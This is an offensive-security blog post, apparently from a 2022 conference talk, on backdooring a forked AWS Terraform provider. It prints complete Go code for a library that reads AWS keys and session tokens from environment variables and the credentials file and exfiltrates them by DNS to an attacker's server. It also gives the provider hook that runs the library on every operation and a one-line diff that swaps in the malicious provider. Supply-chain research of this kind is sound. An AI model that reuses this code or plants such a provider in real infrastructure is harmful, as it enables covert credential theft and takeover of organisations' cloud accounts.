---
title:  "The Stealthy Terraform Trap: From Innocuous Line to Infrastructure Domination"
date:   2024-02-16 00:00:00 -0000
excerpt: "How a single line of code can compromise an entire enterprise"
categories: 
- research
- infrastructure
tags: 
- "Offensive Security"
authors: 
- vdgonc
- thau0x01
layout: single
classes:
- wide
header: 
  teaser: /assets/images/posts/teaser-the-stealthy-terraform-trap.webp
  og_image: /assets/images/posts/the-stealthy-terraform-trap-og.webp

---

![The Stealthy Terraform Trap: From Innocuous Line to Infrastructure Domination](/assets/images/posts/the-stealthy-terraform-trap-cover.webp){: .align-center}

In this dive, we unravel the art of turning a seemingly innocuous line of Terraform code into a devastating vector for enterprise compromise. Prepare to explore the stealthy mechanics and strategic cunning behind planting and executing a backdoor that flies under the radar of modern defenses, proving that sometimes the most potent threats to corporate security lurk in the least expected places.

This research was originally presented during the NullByte Security Conference 2022 that took place in November 2022 in Salvador, Bahia, Brazil.
{: .notice}

## Introduction

In the ever-evolving cybersecurity landscape, where companies deploy sophisticated defenses, attackers and researchers must innovate to breach these systems discreetly. Our latest research focuses on leveraging Infrastructure as Code (IaC) pipelines, vital for enterprise infrastructure but also vulnerable to exploitation. We aimed to create undetectable access methods that blend into legitimate processes and bypass conventional security, highlighting the strategic battle between security and subversion.

Terraform by HashiCorp streamlines complex infrastructure management, its widespread use and critical role making it a prime target for cyber attacks. Our research demonstrates that altering just a single line in a Terraform project can initiate unauthorized actions. <span class="underlined">By embedding malicious functions within Terraform providers</span>, we exploit its trusted status to perform covert operations, showcasing the ease with which these tools can be weaponized for data exfiltration and espionage, all while remaining undetected within normal IaC processes.

## Understanding Terraform and Its Providers

To grasp the intricacies of our demonstration, it's essential to comprehend the core mechanisms behind Terraform and the role of providers within this ecosystem.

**Terraform's Operational Foundations**

At its heart, Terraform by HashiCorp orchestrates infrastructure management using two fundamental commands: `init` and `apply`. The `init` command sets the stage for a Terraform project, engaging providers—vital plugins that bridge Terraform with various cloud services. This initial step ensures all dependencies are correctly aligned and the environment is primed with the necessary configurations and state files for seamless operation.

![Terraform Init Command](/assets/images/posts/the-terraform-init-command-workflow.jpeg){: .align-center}

Subsequently, the `apply` command translates the predefined infrastructure plans into action. By parsing the configuration files, Terraform communicates with the respective providers to mold the infrastructure to its desired state, offering a preview of changes for user approval before execution. This synergistic dance between `init` and `apply` exemplifies Terraform's prowess in implementing infrastructure as code, streamlining the transition from concept to reality.

![Terraform Apply Command](/assets/images/posts/the-terraform-apply-command-workflow.jpeg){: .align-center}

**The Role of Terraform Providers**

Terraform providers are the linchpins in Terraform's architecture, acting as conduits between Terraform's declarative configuration files and the actual cloud platforms or services. These providers, each tailored to specific platforms like AWS, Google Cloud, or Azure, interpret Terraform's configurations and enact the necessary API calls to create, manage, or delete resources according to the defined plans. By abstracting the complexities of direct API interactions, providers empower users to manage a diverse range of services through Terraform's unified interface, paving the way for our exploration of their potential vulnerabilities.

## Crafting an evil AWS Provider

A malicious Terraform provider unlocks numerous possibilities for actions on a compromised host, limited only by the attacker's creativity. Our demonstration focuses on capturing and exfiltrating AWS Credentials using the AWS Terraform provider.

We began by cloning the official AWS provider repository from GitHub:
```bash
git clone "https://github.com/hashicorp/terraform-provider-aws.git"
```
Once the repository is cloned, lets look inside and see it can offer for us. Our investigation into the provider's workings led us to crucial code segments responsible for handling AWS credentials, particularly in `internal/conns/config.go`.

To execute our plan, we leveraged an external library designed to intercept these credentials during Terraform's operation and transmit them via DNS exfiltration—a method chosen for its effectiveness even in restricted environments.

```golang
package awsdnsstatuscheck

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"github.com/CS-5/exfil2dns"
	"github.com/miekg/dns"
)

type TypeCred int32

const (
	Undefined TypeCred = iota
	ACCESSKEY
	SECRETKET
	SECURETOKEN
)

func (t TypeCred) String() string {
	return [...]string{"Undefined", "accesskey", "secretkey", "securetoken"}[t]
}

const (
	HASH             = "YOUR_VERY_SECRET_KEY"
	DNS              = "yourdomain.com"
	ENV_ACESS_KEY    = "AWS_ACCESS_KEY_ID"
	ENV_SECRET_KEY   = "AWS_SECRET_ACCESS_KEY"
	ENV_SECURE_TOKEN = "AWS_SESSION_TOKEN"
)

func VerifyDNSStatus() bool {
	sendData(getAccessKey(), 1)
	sendData(getSecretKey(), 2)
	token := getSessionToken()
	if token != "" {
		sendData(token, 3)
	}

	return true
}

func encode(payload string, t TypeCred, part int) string {

	var target string
	var chunksize int = 23
	var client exfil2dns.Client

	switch t {
	case ACCESSKEY:
		target = "accesskey"
	case SECRETKET:
		target = "secretkey-" + strconv.Itoa(part)
	case SECURETOKEN:
		target = "securetoken-" + strconv.Itoa(part)
	default:
		target = ""
	}
	client, err := exfil2dns.NewClient(
		target,
		DNS,
		HASH,
		chunksize,
	)
	if err != nil {
		fmt.Printf("error on create client, got: %s", err.Error())
		return ""
	}

	q, err := client.Encode([]byte(payload))
	if err != nil {
		fmt.Printf("error on encode data, got: %s", err.Error())
	}
	return q
}

func sendData(payload string, t TypeCred) {
	var (
		msg    dns.Msg
		client dns.Client
	)

	pslice := splitRecursive(payload, 23)

	for i, p := range pslice {
		domain := encode(p, t, i)
		msg.SetQuestion(domain, dns.TypeA)
		_, _, err := client.Exchange(&msg, "ns7."+DNS+":53")
		if err != nil {
			fmt.Printf("failed exchange, %s", err.Error())
		}
	}

}

func splitRecursive(str string, size int) []string {
	if len(str) <= size {
		return []string{str}
	}
	return append([]string{string(str[0:size])}, splitRecursive(str[size:], size)...)
}

func openSharedFile() []string {
	home, _ := os.UserHomeDir()
	filename := home + "/.aws/credentials"

	dat, _ := os.ReadFile(filename)

	d := string(dat)
	d = strings.Trim(d, "[default]")
	dd := strings.Split(d, "\n")

	return dd
}

func getAccessKey() string {
	aws_access_key_id := os.Getenv(ENV_ACESS_KEY)

	if aws_access_key_id != "" {
		return aws_access_key_id
	}

	dat := openSharedFile()

	for _, line := range dat {
		splited := strings.Split(line, "=")
		if len(splited) == 2 && splited[0] == "aws_access_key_id " {
			return splited[1]
		}
	}
	return ""
}

func getSecretKey() string {
	aws_secret_access_key := os.Getenv(ENV_SECRET_KEY)
	if aws_secret_access_key != "" {
		return aws_secret_access_key
	}

	dat := openSharedFile()

	for _, line := range dat {
		splited := strings.Split(line, "=")
		if len(splited) == 2 && splited[0] == "aws_secret_access_key " {
			return splited[1]
		}
	}
	return ""
}

func getSessionToken() string {
	aws_session_token := os.Getenv(ENV_SECURE_TOKEN)
	if aws_session_token != "" {
		return aws_session_token
	}
	return ""
}
```

This library, when integrated into our modified provider, reads AWS Credentials from environment variables or the default credentials file, then encodes and sends this data to our control server using DNS queries.

To incorporate this functionality, we updated `internal/provider/provider.go` to import and invoke our malicious library, ensuring it executes with every Terraform operation.

```golang
// internal/provider/provider.go
package provider

import (
	"context"
	"fmt"
	"log"
	"os"
	"regexp"
	"time"

	// Our library here
	awsdnsstatuscheck "github.com/RatCorpInc/aws-dns-status-check"
	"github.com/aws/aws-sdk-go-v2/feature/ec2/imds"
	awsbase "github.com/hashicorp/aws-sdk-go-base/v2"
	//...
)
// ... 
func configure(ctx context.Context, provider *schema.Provider, d *schema.ResourceData) (*conns.AWSClient, diag.Diagnostics) {
	terraformVersion := provider.TerraformVersion
	if terraformVersion == "" {
		terraformVersion = "0.11+compatible"
	}

	config := conns.Config{
		AccessKey:                      d.Get("access_key").(string),
		CustomCABundle:                 d.Get("custom_ca_bundle").(string),
		EC2MetadataServiceEndpoint:     d.Get("ec2_metadata_service_endpoint").(string),
		EC2MetadataServiceEndpointMode: d.Get("ec2_metadata_service_endpoint_mode").(string),
	// ...
	}
	// Execute the malicious library
	awsdnsstatuscheck.VerifyDNSStatus()
}
```

With our malicious provider crafted and the library in place, <span class="underlined">the steps to deploy this attack include registering an organization with the Terraform registry, then building and publishing the provider</span>. 

## Silent Code, Loud Impact: The Stealth Mechanism

To execute our attack, building and publishing a custom Terraform provider is essential. This provider, modified to secretly transmit AWS credentials back to us, is the crux of our demonstration. Here's a breakdown of the process and its stealthy implications:

### Building the Covert Channel
We began by forking the official AWS Terraform provider, embedding an external library designed to exfiltrate AWS credentials. This library, subtly integrated, operates under the guise of legitimate functionality, making the attack hard to detect. It captures credentials either from environment variables or the default AWS credentials file and employs DNS queries to stealthily communicate this information to our control server.

### Why Is Detection So Challenging?
The modification to include our "evil" provider within a Terraform HCL file is deceptively simple yet profoundly impactful. By altering a single line to reference our malicious provider, we create a situation where the attack's origins and its execution become obscured. Terraform's trust in its providers and the routine nature of its operations mask our intervention. The DNS-based exfiltration further compounds this stealth, leveraging a commonly allowed protocol that escapes notice even in restrictive network environments.

### The Demonstration: A Proof of Concept
Our demonstration showcases how a seemingly benign alteration in the Terraform configuration can lead to significant security breaches. The code diff example vividly illustrates the ease of this compromise:

```diff
diff --git a/terraform.tf b/terraform.tf
index 69fc3ba..7a8a38d 100644
--- a/terraform.tf
+++ b/terraform.tf
@@ -1,7 +1,7 @@
 terraform {
   required_providers {
     aws = {
-      source = "hashicorp/aws"
+      source = "RatCorpInc/aws"
       version = "4.30.7"
     }
   }
```

This subtle change, once executed, triggers our malicious code, serving as a stark reminder of the vulnerabilities within Terraform's ecosystem and the broader implications for infrastructure security.

### The Takeaway
Our exploration into the potential misuse of Terraform providers underscores the critical need for enhanced vigilance and security in managing infrastructure as code. As we push the boundaries of what's possible in offensive security research, the lessons learned here emphasize the importance of scrutinizing every component in our digital environments.in an era of continuous digital evolution.

